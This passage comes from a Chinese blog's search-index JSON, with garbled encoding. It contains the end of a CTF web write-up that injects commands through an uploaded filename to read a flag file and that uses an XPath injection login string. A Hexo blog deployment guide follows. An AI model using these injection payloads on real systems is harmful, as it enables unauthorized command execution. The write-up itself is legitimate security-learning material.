(preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) &#123; echo &quot;&lt;a href=&#x27;index.php/?file=&quot; . $filename . &quot;&#x27;&gt;&quot; . $filename . &quot;&lt;/a&gt;&lt;br&gt;&quot;; &#125; &#125; echo &#x27; &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; é€‰æ‹©å›¾ç‰‡ï¼š&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;&lt;/form&gt; &#x27;; if ($_FILES[&#x27;file&#x27;]) &#123; $filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; if (!preg_match(&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;, $filename)) &#123; die(&quot;hacker!&quot;); &#125; if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $filename)) &#123; echo &quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡ä¸Šä¼ æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;; &#125; else &#123; die(&#x27;failed&#x27;); &#125; &#125; &#125; else &#123; $filename = $_GET[&#x27;file&#x27;]; if ($_GET[&#x27;todo&#x27;] === &quot;md5&quot;) &#123; echo md5_file($filename); &#125; else &#123; $file = new FILE($filename); if ($_GET[&#x27;todo&#x27;] !== &quot;remove&quot; &amp;&amp; $_GET[&#x27;todo&#x27;] !== &quot;show&quot;) &#123; echo &quot;&lt;img src=&#x27;../&quot; . $filename . &quot;&#x27;&gt;&lt;br&gt;&quot;; echo &quot;&lt;a href=&#x27;../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;; echo &quot;&lt;a href=&#x27;../index.php/?file=&quot; . $filename . &quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;; &#125; else if ($_GET[&#x27;todo&#x27;] === &quot;remove&quot;) &#123; $file-&gt;remove(); echo &quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡å·²åˆ é™¤!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;; &#125; else if ($_GET[&#x27;todo&#x27;] === &quot;show&quot;) &#123; $file-&gt;show(); &#125; &#125; &#125; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; åˆ†ææºç ï¼Œå‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ ç™½åå•ï¼ˆjpg|jpeg|gif|png|bmpåç¼€åï¼‰ ç»§ç»­åˆ†æï¼Œå‘ç°class FILEçš„system(&quot;ls -all &quot; . $this-&gt;filename);å¤„å­˜åœ¨å‘½ä»¤æ‹¼æ¥ ä½†æ˜¯æœ‰æ¡ä»¶ï¼Œå¿…é¡»ä¿è¯æ–‡ä»¶åæœ‰ä¸”åªæœ‰ä¸€ä¸ª.ï¼Œå¹¶ä¸”ä¸èƒ½å«æœ‰\\/ æ¥ä¸‹æ¥æƒ³æ–¹æ³•ç»•è¿‡ é¦–å…ˆä¸Šä¼ æ–‡ä»¶1111.jpgï¼Œæ–‡ä»¶å†…å®¹ä¸ºls /ç”¨æ¥æŸ¥çœ‹æ ¹ç›®å½•flagæ–‡ä»¶å æ¥ä¸‹æ¥ä¸Šä¼ åä¸º;`cat 111*`;1.jpgçš„æ–‡ä»¶å†è¿›è¡Œ?filename=;`cat 111*`;1.jpg&amp;todo=showï¼Œå‘ç°æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼Œè¿”å›å¾—åˆ°flagè·¯å¾„adjaskdhnask_flag_is_here_dakjdnmsakjnfksd æœ€åæ›´æ¢æ–‡ä»¶å†…å®¹ä¸ºcat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksdï¼Œå†æ¬¡æ‰§è¡Œå‘½ä»¤å¾—åˆ°flag åŸç†xpathæ³¨å…¥é¢˜ç›®ä¸­xpathæŸ¥è¯¢è¯­å¥æ‹¼æ¥åä¸º 1/accounts/user[username=&#x27;admin&#x27;&#x27; and password=&#x27;&#x27;]|//*|//*[&#x27;&#x27;] å…¶å®åé¢ä¸é‡è¦ï¼Œå› ä¸ºadminçš„å¼•å·å·²ç»å°†æŸ¥è¯¢è¯­å¥é—­åˆäº† ç›¸å½“äº 1/accounts/user[username=&#x27;admin&#x27;] äºæ˜¯ç›¸å½“äºæŸ¥è¯¢æ˜¯å¦æœ‰adminè´¦æˆ·ï¼Œå¾—åˆ°ç»“æœ rce;å¯ä»¥åˆ†éš”ä¸€ä¸²å‘½ä»¤ `Linuxä¸­åå¼•å·çš„ä½œç”¨æ˜¯åœ¨å°†åå¼•å·å†…çš„å‘½ä»¤å¤„ç†å®Œæ¯•ä¹‹åï¼Œä¼šå°†è¿”å›çš„ä¿¡æ¯ä¼ ç»™åå¼•å·çš„ä½ç½®ï¼Œå†æ¬¡æ‰§è¡Œå‘½ä»¤ åè®°çœ‹äº†ç½‘ä¸Šå¥½å¤šwpï¼Œå‘ç°æˆ‘çš„åšæ³•è²Œä¼¼æ˜¯éé¢„æœŸ é¢„æœŸè§£æ˜¯md5_fileå‡½æ•°ç»“åˆpharæ‰“çš„ å¤ªèœäº†å¤ªèœäº†ï¼Œåˆ«çš„é¢˜ç›®ä¸ºä»€ä¹ˆä¸å†™wpï¼Œå› ä¸ºéƒ½ä¸ä¼šã€‚ã€‚ã€‚ã€‚ã€‚","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"},{"name":"xpathæ³¨å…¥","slug":"xpathæ³¨å…¥","permalink":"https://blog.lazyforever.top/tags/xpath%E6%B3%A8%E5%85%A5/"},{"name":"rce","slug":"rce","permalink":"https://blog.lazyforever.top/tags/rce/"},{"name":"php","slug":"php","permalink":"https://blog.lazyforever.top/tags/php/"}]},{"title":"ä½¿ç”¨hexoæ¡†æ¶æ­å»ºgithubé™æ€åšå®¢","slug":"hexo","date":"2023-06-30T07:26:57.000Z","updated":"2023-06-30T08:41:41.280Z","comments":true,"path":"2023/06/30/hexo/","link":"","permalink":"https://blog.lazyforever.top/2023/06/30/hexo/","excerpt":"","text":"ç¬¬ä¸€æ¬¡ä½¿ç”¨ hexo æ­å»ºé™æ€ç½‘ç«™ï¼Œè¸©äº†å¥½å¤šå‘ï¼Œç«‹æ­¤è´´è®°å½•ä¸€ä¸‹ æœ¬åœ°é…ç½®Hexoå®‰è£…NodejsNodejså®˜æ–¹åœ°å€ ä»ä»¥ä¸Šé“¾æ¥ä¸‹è½½ nodejs å®‰è£…ï¼ˆå®˜ç½‘ä¸‹è½½ç¨æ…¢ï¼Œå»ºè®®ç¿»å¢™ï¼‰ è®¾ç½®npmæ·˜å®é•œåƒç«™npm é»˜è®¤çš„æºçš„ä¸‹è½½é€Ÿåº¦å¯èƒ½å¾ˆæ…¢ï¼Œå»ºè®®ä½¿ç”¨æ·˜å®é•œåƒæ›¿æ¢ã€‚æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå°† npm çš„æºè®¾ç½®æˆæ·˜å®é•œåƒç«™ã€‚ 1npm config set registry &quot;https://registry.npm.taobao.org&quot; å®‰è£…gitgitå®˜æ–¹é“¾æ¥ ä»ä»¥ä¸Šé“¾æ¥ä¸‹è½½ git å®‰è£… ä¸€è·¯ç¡®è®¤ï¼Œå®‰è£…æ—¶è¦å‹¾é€‰ Add to PATH é€‰é¡¹ éªŒè¯cmd è¾“å…¥ä»¥ä¸‹å‘½ä»¤è§‚å¯Ÿæ˜¯å¦æ‰§è¡Œæ­£ç¡® 12git --versionnpm -v åˆå§‹åŒ–Hexoæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£… hexo 1npm install hexo-cli g åœ¨ç”µè„‘çš„æŸä¸ªç£ç›˜æˆ–è·¯å¾„æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹(åå­—å¯ä»¥éšä¾¿å–)ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯ D:\\blogï¼Œç”±äºè¿™ä¸ªæ–‡ä»¶å¤¹å°†æ¥å°±ä½œä¸ºæ‚¨å­˜æ”¾åšå®¢çš„åœ°æ–¹ï¼Œæ‰€ä»¥æœ€å¥½ä¸è¦éšä¾¿æ”¾ åœ¨ D:\\blog æ–‡ä»¶å¤¹ä¸‹å³é”®æ‰“å¼€ Git Bash Hereï¼Œè¾“å…¥å‘½ä»¤: hexo init è¿›è¡Œåˆå§‹åŒ– hexo ä¼šè‡ªåŠ¨ä¸‹è½½ä¸€äº›æ–‡ä»¶åˆ°è¿™ä¸ªç›®å½• æ¥ç€åœ¨ cmd ä¸­å®‰è£…å…¶ä»– hexo æ’ä»¶ 123456789npm installnpm install hexo-server --savenpm install hexo-admin --savenpm install hexo-generator-archive --savenpm install hexo-generator-feed --savenpm install hexo-generator-search --savenpm install hexo-generator-tag --savenpm install hexo-deployer-git --savenpm install hexo-generator-sitemap --save è‡³æ­¤ï¼Œæœ¬åœ° hexo é…ç½®å®Œæ¯•ã€‚ ç°åœ¨å¯ä»¥ä½¿ç”¨ hexo æ­å»ºæœ¬åœ°æœåŠ¡å™¨æ¥ä½¿ç”¨ ä½¿ç”¨ hexo g ç”Ÿæˆé™æ€é¡µé¢ï¼Œä½¿ç”¨ hexo s å¼€å¯æœ¬åœ°æœåŠ¡å™¨ï¼Œæ¥ä¸‹æ¥å¯ä»¥ç”¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ localhost:4000 æ¥çœ‹è§åˆšåˆšåˆ›å»ºçš„åšå®¢ éƒ¨ç½²githubé…ç½® Githubæ³¨å†Œ github è´¦å·ï¼Œå¹¶åœ¨ä¸»é¡µåˆ›å»ºä»“åº“ï¼Œåå­—ä¸º [yourname].github.io é…ç½®sshæ‰“å¼€git bashç»ˆç«¯è®¾ç½® user.name å’Œ user.email 12git config --global user.name &quot;ä½ çš„GitHubç”¨æˆ·å&quot;git config --global user.email &quot;ä½ çš„GitHubæ³¨å†Œé‚®ç®±&quot; ç”Ÿæˆsshå¯†åŒ™ 1ssh-keygen -t rsa -C &quot;ä½ çš„GitHubæ³¨å†Œé‚®ç®±&quot; å°†å…¬åŒ™æ·»åŠ åˆ° github ä¸Š å°†hexoåšå®¢éƒ¨ç½²åˆ°githubä¸Šä¿®æ”¹é…ç½®æ–‡ä»¶ blog&#x2F;_config.ymlï¼Œä¿®æ”¹deployé¡¹çš„å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š æ³¨æ„ï¼š åˆ†æ”¯ï¼ˆbranchï¼‰è¦ä¸è‡ªå·±åˆ›å»ºä»“åº“çš„åˆ†æ”¯åç§°ä¸€è‡´ï¼ˆæ³¨æ„masterä¸mainçš„åŒºåˆ«ï¼‰ å†’å·åé¢å¿…é¡»æ·»åŠ ä¸€ä¸ªç©ºæ ¼ ä¿æŒç¼©è¿›æ ¼å¼ä¸€è‡´ ç»™å‡ºç¤ºä¾‹ï¼š 123456# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy: - type: git repo: https://github.com/lazy-forever/lazy-forever.github.io.git branch: main éƒ¨ç½²hexoè¾“å…¥ä¸‹é¢çš„å‘½ä»¤å°†hexoåšå®¢éƒ¨ç½²åˆ°githubä¸­ï¼š 123hexo cl #æ¸…ç†ä¹‹å‰ç”Ÿæˆçš„æ–‡ä»¶hexo g #ç”Ÿæˆé™æ€é¡µé¢hexo d #éƒ¨ç½² éš”ä¸€æ®µæ—¶é—´åæ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥ [yourname].github.io å³å¯çœ‹åˆ°æˆ‘ä»¬éƒ¨ç½²çš„åšå®¢ å…³äºç¿»å¢™ä¼—æ‰€å‘¨çŸ¥ï¼Œä¸­å›½å¤§é™†å¢ƒå†…å¯¹äº github çš„è®¿é—®ä¸€ç›´å¤„äºæ—¶å¸¸èƒ½è¿ä¸Šæ—¶å¸¸è¿ä¸ä¸Šçš„çŠ¶æ€ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬åœ¨æ‰§è¡Œ hexo d å‘½ä»¤æ—¶ç¿»å¢™ï¼Œä¼šè®©éƒ¨ç½²çš„è¿‡ç¨‹æ›´åŠ ä¸æ»‘ã€‚ æˆ‘çš„ç”µè„‘ä¸€ç›´åœ¨ä½¿ç”¨ clash è¿›è¡Œç¿»å¢™ï¼Œè€Œåœ¨ cmd ä¸­ä½¿ç”¨hexo dæ—¶ï¼Œclash å¿…é¡»ç”¨ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å¹¶å¼€å¯å¢å¼ºåŠŸèƒ½ï¼Œå¦‚å›¾ï¼š","categories":[{"name":"åšå®¢","slug":"åšå®¢","permalink":"https://blog.lazyforever.top/categories/%E5%8D%9A%E5%AE%A2/"}],"tags":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://blog.lazyforever.top/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"My First Blog","slug":"hello-world","date":"2023-05-29T10:00:00.000Z","updated":"2023-05-31T15:54:21.269Z","comments":true,"path":"2023/05/29/hello-world/","link":"","permalink":"https://blog.lazyforever.top/2023/05/29/hello-world/","excerpt":"","text":"è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢ã€‚","categories":[],"tags":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://blog.lazyforever.top/tags/%E5%85%B6%E4%BB%96/"}]}],"categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://blog.lazyforever.top/categories/WriteUp/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://blog.lazyforever.top/categories/%E6%8A%80%E6%9C%AF/"},{"name":"awd","slug":"awd","permalink":"https://blog.lazyforever.top/categories/awd/"},{"name":"åšå®¢","slug":"åšå®¢","permalink":"https://blog.lazyforever.top/categories/%E5%8D%9A%E5%AE%A2/"}],"tags":[{"name":"web","slug":"web","permalink":"https://blog.lazyforever.top/tags/web/"},{"name":"Javaå®‰å…¨","slug":"Javaå®‰å…¨","permalink":"https://blog.lazyforever.top/tags/Java%E5%AE%89%E5%85%A8/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://blog.lazyforever.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"CCé“¾","slug":"CCé“¾","permalink":"https://blog.lazyforever.top/tags/CC%E9%93%BE/"},{"name":"wireshark","slug":"wireshark","permalink":"https://blog.lazyforever.top/tags/wireshark/"},{"name":"apké€†å‘","slug":"apké€†å‘","permalink":"https://blog.lazyforever.top/tags/apk%E9%80%86%E5%90%91/"},{"name":"frida","slug":"frida","permalink":"https://blog.lazyforever.top/tags/frida/"},{"name":"mitmproxy","slug":"mitmproxy","permalink":"https://blog.lazyforever.top/tags/mitmproxy/"},{"name":"jeb","slug":"jeb","permalink":"https://blog.lazyforever.top/tags/jeb/"},{"name":"jadx","slug":"jadx","permalink":"https://blog.lazyforever.top/tags/jadx/"},{"name":"reverse","slug":"reverse","permalink":"https://blog.lazyforever.top/tags/reverse/"},{"name":"misc","slug":"misc","permalink":"https://blog.lazyforever.top/tags/misc/"},{"name":"pwn","slug":"pwn","permalink":"https://blog.lazyforever.top/tags/pwn/"},{"name":"crypto","slug":"crypto","permalink":"https://blog.lazyforever.top/tags/crypto/"},{"name":"rce","slug":"rce","permalink":"https://blog.lazyforever.top/tags/rce/"},{"name":"php","slug":"php","permalink":"https://blog.lazyforever.top/tags/php/"},{"name":"awd","slug":"awd","permalink":"https://blog.lazyforever.top/tags/awd/"},{"name":"xpathæ³¨å…¥","slug":"xpathæ³¨å…¥","permalink":"https://blog.lazyforever.top/tags/xpath%E6%B3%A8%E5%85%A5/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://blog.lazyforever.top/tags/%E6%8A%80%E6%9C%AF/"},{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://blog.lazyforever.top/tags/%E5%85%B6%E4%BB%96/"}]}